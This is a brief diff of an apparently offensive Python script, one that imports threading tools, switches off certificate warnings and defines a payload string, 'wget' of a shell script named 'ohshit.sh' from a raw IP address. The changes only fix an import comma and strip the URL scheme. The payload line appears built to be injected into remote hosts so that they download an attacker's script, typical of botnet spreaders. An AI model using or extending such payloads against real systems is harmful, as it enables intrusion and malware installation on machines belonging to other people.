@@ -1,8 +1,8 @@
-import requests, urllib3, sys, threading, os vthread
+import requests, urllib3, sys, threading, os ,vthread
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-payload = 'wget http://79.137.198.58/ohshit.sh'
+payload = 'wget 79.137.198.58/ohshit.sh'
 
 
 
